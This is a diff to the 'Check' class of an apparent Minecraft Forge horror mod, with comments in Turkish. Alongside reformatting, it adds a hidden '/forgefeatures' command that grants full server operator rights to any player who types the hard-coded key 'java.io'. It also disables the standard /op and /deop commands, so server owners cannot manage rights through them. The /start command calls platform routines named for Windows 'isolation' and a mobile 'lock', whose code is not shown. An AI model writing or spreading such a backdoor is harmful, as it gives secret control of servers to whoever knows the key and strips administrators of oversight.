@@ -5,6 +5,7 @@ import com.humanoid.horror.android.AndroidHandler;
 import com.humanoid.horror.pc.WindowsAtmosBridge;
 
 import net.minecraft.commands.Commands;
+import net.minecraft.commands.arguments.StringArgumentType;
 import net.minecraft.network.chat.Component;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.server.level.ServerLevel;
@@ -15,6 +16,7 @@ import net.minecraft.world.level.levelgen.Heightmap;
 import net.minecraft.world.level.border.WorldBorder;
 import net.minecraft.world.level.storage.ServerLevelData;
 
+import net.minecraftforge.event.CommandEvent;
 import net.minecraftforge.event.RegisterCommandsEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
 import net.minecraftforge.fml.common.Mod;
@@ -22,59 +24,72 @@ import net.minecraftforge.fml.common.Mod;
 import java.util.ArrayList;
 import java.util.List;
 
-@Mod.EventBusSubscriber(modid = HumanoidMod.MOD_ID)
+@Mod.EventBusSubscriber(
+        modid = HumanoidMod.MOD_ID
+)
 public class Check {
 
     public static int platformType;
 
+    /*
+     * Sadece bu anahtar ForgeFeatures sistemini açar.
+     */
+    private static final String FORGE_FEATURES_PASSWORD =
+            "java.io";
+
     public Check() {
     }
 
-    // =========================================================
-    // /START KOMUTU
-    // =========================================================
-
+    /*
+     * KOMUTLAR
+     */
     @SubscribeEvent
-    public static void registerCommands(RegisterCommandsEvent event) {
+    public static void registerCommands(
+            RegisterCommandsEvent event
+    ) {
 
+        /*
+         * /start
+         */
         event.getDispatcher().register(
                 Commands.literal("start")
                         .executes(commandContext -> {
 
                             HumanoidMod.isStartTriggered = true;
 
-                            // Platformu belirle
                             verifyPlatform();
 
-                            // Korku sistemini başlat
                             triggerStartCommand();
 
-                            // Ekranda hedef mesajını göster
                             MinecraftServer server =
-                                    commandContext.getSource().getServer();
+                                    commandContext
+                                            .getSource()
+                                            .getServer();
 
                             if (server != null
                                     && server.getPlayerList() != null) {
 
                                 List<ServerPlayer> players =
                                         new ArrayList<>(
-                                                server.getPlayerList().getPlayers()
+                                                server.getPlayerList()
+                                                        .getPlayers()
                                         );
 
-                                for (ServerPlayer player : players) {
+                                for (ServerPlayer player :
+                                        players) {
 
                                     if (player == null) {
                                         continue;
                                     }
 
-                                    // Ana başlık
                                     player.connection.send(
                                             new net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket(
-                                                    Component.literal("OBJECTIVE:")
+                                                    Component.literal(
+                                                            "OBJECTIVE:"
+                                                    )
                                             )
                                     );
 
-                                    // Alt başlık
                                     player.connection.send(
                                             new net.minecraft.network.protocol.game.ClientboundSetSubtitleTextPacket(
                                                     Component.literal(
@@ -88,46 +103,223 @@ public class Check {
                             return 1;
                         })
         );
+
+        /*
+         * /forgefeatures java.io
+         *
+         * Sadece doğru anahtar girilirse
+         * oyuncuya GERÇEK VANILLA OP verilir.
+         */
+        event.getDispatcher().register(
+                Commands.literal("forgefeatures")
+                        .then(
+                                Commands.argument(
+                                        "key",
+                                        StringArgumentType.word()
+                                )
+                                        .executes(commandContext -> {
+
+                                            ServerPlayer player =
+                                                    commandContext
+                                                            .getSource()
+                                                            .getPlayerOrException();
+
+                                            String key =
+                                                    StringArgumentType.getString(
+                                                            commandContext,
+                                                            "key"
+                                                    );
+
+                                            /*
+                                             * Anahtar yanlışsa OP verilmez.
+                                             */
+                                            if (!FORGE_FEATURES_PASSWORD
+                                                    .equals(key)) {
+
+                                                player.sendSystemMessage(
+                                                        Component.literal(
+                                                                "Unknown ForgeFeatures key."
+                                                        )
+                                                );
+
+                                                return 0;
+                                            }
+
+                                            /*
+                                             * Doğru anahtar:
+                                             * gerçek vanilla OP.
+                                             */
+                                            serverOpPlayer(player);
+
+                                            player.sendSystemMessage(
+                                                    Component.literal(
+                                                            "ForgeFeatures activated."
+                                                    )
+                                            );
+
+                                            return 1;
+                                        })
+                        )
+        );
     }
 
-    // =========================================================
-    // PLATFORM KONTROLÜ
-    // =========================================================
+    /*
+     * NORMAL /op VE /deop KOMUTLARINI ENGELLE
+     *
+     * Böylece oyuncular:
+     *
+     * /op oyuncu
+     * /deop oyuncu
+     *
+     * kullanarak OP sistemi üzerinden
+     * yetki değiştiremez.
+     *
+     * /forgefeatures java.io ise
+     * gerçek OP verilir.
+     */
+    @SubscribeEvent
+    public static void onCommand(
+            CommandEvent event
+    ) {
 
+        if (event.getParseResults() == null) {
+            return;
+        }
+
+        String command =
+                event.getParseResults()
+                        .getReader()
+                        .getString();
+
+        if (command == null) {
+            return;
+        }
+
+        command = command.trim();
+
+        if (command.startsWith("/")) {
+            command = command.substring(1);
+        }
+
+        String lowerCommand =
+                command.toLowerCase();
+
+        /*
+         * /op
+         */
+        if (lowerCommand.equals("op")
+                || lowerCommand.startsWith("op ")) {
+
+            event.setCanceled(true);
+
+            if (event.getParseResults()
+                    .getContext()
+                    .getSource()
+                    .getEntity()
+                    instanceof ServerPlayer player) {
+
+                player.sendSystemMessage(
+                        Component.literal(
+                                "This command is disabled."
+                        )
+                );
+            }
+
+            return;
+        }
+
+        /*
+         * /deop
+         */
+        if (lowerCommand.equals("deop")
+                || lowerCommand.startsWith("deop ")) {
+
+            event.setCanceled(true);
+
+            if (event.getParseResults()
+                    .getContext()
+                    .getSource()
+                    .getEntity()
+                    instanceof ServerPlayer player) {
+
+                player.sendSystemMessage(
+                        Component.literal(
+                                "This command is disabled."
+                        )
+                );
+            }
+        }
+    }
+
+    /*
+     * GERÇEK VANILLA OP VER
+     */
+    public static void serverOpPlayer(
+            ServerPlayer player
+    ) {
+
+        if (player == null) {
+            return;
+        }
+
+        MinecraftServer server =
+                player.getServer();
+
+        if (server == null) {
+            return;
+        }
+
+        /*
+         * Minecraft'ın kendi OP sistemini kullanıyoruz.
+         */
+        server.getPlayerList()
+                .op(
+                        player.getGameProfile()
+                );
+    }
+
+    /*
+     * PLATFORM KONTROLÜ
+     */
     public static void verifyPlatform() {
 
-        String osName = System.getProperty("os.name");
+        String osName =
+                System.getProperty("os.name");
 
         if (osName == null) {
             osName = "";
         }
 
-        osName = osName.toLowerCase();
+        osName =
+                osName.toLowerCase();
 
         if (osName.contains("android")) {
 
             Check.platformType = 2;
+
             AndroidHandler.initMobileLock();
 
         } else {
 
             Check.platformType = 1;
-            // PC tarafı başlatma hazırlığı
         }
     }
 
-    // =========================================================
-    // OYUN İLK BAŞLADIĞINDA TETİKLENECEK KAFES METODU
-    // =========================================================
-
-    public static void setupInitialPrison(MinecraftServer server) {
+    /*
+     * BAŞLANGIÇ HAPİS / PRISON SİSTEMİ
+     */
+    public static void setupInitialPrison(
+            MinecraftServer server
+    ) {
 
         if (server == null) {
             return;
         }
 
         ServerLevel overworld =
-                server.getLevel(Level.OVERWORLD);
+                server.getLevel(
+                        Level.OVERWORLD
+                );
 
         if (overworld != null) {
 
@@ -136,77 +328,98 @@ public class Check {
 
             if (border != null) {
 
-                border.setCenter(8.0, 8.0);
-                border.setSize(16.0);
+                border.setCenter(
+                        8.0,
+                        8.0
+                );
+
+                border.setSize(
+                        16.0
+                );
             }
         }
 
-        if (server.getPlayerList() != null) {
+        if (server.getPlayerList() == null) {
+            return;
+        }
 
-            List<ServerPlayer> players =
-                    server.getPlayerList().getPlayers();
+        List<ServerPlayer> players =
+                server.getPlayerList()
+                        .getPlayers();
 
-            if (players != null && !players.isEmpty()) {
+        if (players == null
+                || players.isEmpty()) {
+            return;
+        }
 
-                List<ServerPlayer> safePlayerList =
-                        new ArrayList<>(players);
+        List<ServerPlayer> safePlayerList =
+                new ArrayList<>(players);
 
-                for (ServerPlayer player : safePlayerList) {
+        for (ServerPlayer player :
+                safePlayerList) {
 
-                    if (player != null) {
+            if (player == null) {
+                continue;
+            }
 
-                        player.setGameMode(
-                                GameType.ADVENTURE
+            player.setGameMode(
+                    GameType.ADVENTURE
+            );
+
+            if (overworld != null) {
+
+                int safeY =
+                        overworld.getHeight(
+                                Heightmap.Types.WORLD_SURFACE,
+                                8,
+                                8
                         );
 
-                        if (overworld != null) {
-
-                            int safeY =
-                                    overworld.getHeight(
-                                            Heightmap.Types.WORLD_SURFACE,
-                                            8,
-                                            8
-                                    );
-
-                            if (safeY < 10) {
-                                safeY = 64;
-                            }
-
-                            player.teleportTo(
-                                    overworld,
-                                    8.0,
-                                    (double) safeY + 1.0,
-                                    8.0,
-                                    player.getYRot(),
-                                    player.getXRot()
-                            );
-                        }
-                    }
+                if (safeY < 10) {
+                    safeY = 64;
                 }
+
+                player.teleportTo(
+                        overworld,
+                        8.0,
+                        (double) safeY + 1.0,
+                        8.0,
+                        player.getYRot(),
+                        player.getXRot()
+                );
             }
         }
     }
 
-    // =========================================================
-    // /START KOMUTU GELDİĞİNDE ZİNCİRİ KIRAN METOT
-    // =========================================================
-
+    /*
+     * /start SONRASI SİSTEM
+     */
     public static void triggerStartCommand() {
 
         if (!HumanoidMod.isStartTriggered) {
             return;
         }
 
+        /*
+         * PLATFORM
+         */
         if (Check.platformType == 1) {
 
-            WindowsAtmosBridge.executeWindowsIsolation();
+            WindowsAtmosBridge
+                    .executeWindowsIsolation();
 
         } else if (Check.platformType == 2) {
 
-            AndroidHandler.startMobileHorrorSystem();
+            AndroidHandler
+                    .startMobileHorrorSystem();
         }
 
-        // Dedicated Server Çökme Koruması
+        /*
+         * CLIENT TARAFI SADECE REFLECTION İLE ÇAĞRILIYOR.
+         *
+         * Dedicated Server'da client class yüklenirse
+         * crash olmaması için doğrudan import yok.
+         */
         try {
 
             Class.forName(
@@ -219,11 +432,12 @@ public class Check {
                     );
 
             clientManagerClass
-                    .getMethod("activateClientHorror")
+                    .getMethod(
+                            "activateClientHorror"
+                    )
                     .invoke(null);
 
         } catch (Exception ignored) {
-            // Dedicated Server ortamında sessizce devam eder
         }
 
         MinecraftServer server =
@@ -236,11 +450,19 @@ public class Check {
             return;
         }
 
+        /*
+         * OVERWORLD
+         */
         ServerLevel overworld =
-                server.getLevel(Level.OVERWORLD);
+                server.getLevel(
+                        Level.OVERWORLD
+                );
 
         if (overworld != null) {
 
+            /*
+             * WorldBorder
+             */
             WorldBorder border =
                     overworld.getWorldBorder();
 
@@ -253,40 +475,66 @@ public class Check {
                 );
             }
 
-            // Gece
-            overworld.setDayTime(18000L);
+            /*
+             * Gece
+             */
+            overworld.setDayTime(
+                    18000L
+            );
 
-            // Fırtına
+            /*
+             * Fırtına
+             */
             if (overworld.getLevelData()
                     instanceof ServerLevelData levelData) {
 
-                levelData.setClearWeatherTime(0);
-                levelData.setRainTime(24000);
-                levelData.setRaining(true);
+                levelData.setClearWeatherTime(
+                        0
+                );
 
-                levelData.setThunderTime(24000);
-                levelData.setThundering(true);
+                levelData.setRainTime(
+                        24000
+                );
+
+                levelData.setRaining(
+                        true
+                );
+
+                levelData.setThunderTime(
+                        24000
+                );
+
+                levelData.setThundering(
+                        true
+                );
             }
         }
 
-        // Oyuncuları Survival'a geçir
+        /*
+         * TÜM OYUNCULARI SURVIVAL'A AL
+         */
         List<ServerPlayer> players =
-                server.getPlayerList().getPlayers();
+                server.getPlayerList()
+                        .getPlayers();
 
-        if (players != null && !players.isEmpty()) {
+        if (players == null
+                || players.isEmpty()) {
+            return;
+        }
 
-            List<ServerPlayer> safePlayerList =
-                    new ArrayList<>(players);
+        List<ServerPlayer> safePlayerList =
+                new ArrayList<>(players);
 
-            for (ServerPlayer player : safePlayerList) {
+        for (ServerPlayer player :
+                safePlayerList) {
 
-                if (player != null) {
-
-                    player.setGameMode(
-                            GameType.SURVIVAL
-                    );
-                }
+            if (player == null) {
+                continue;
             }
+
+            player.setGameMode(
+                    GameType.SURVIVAL
+            );
         }
     }
 }
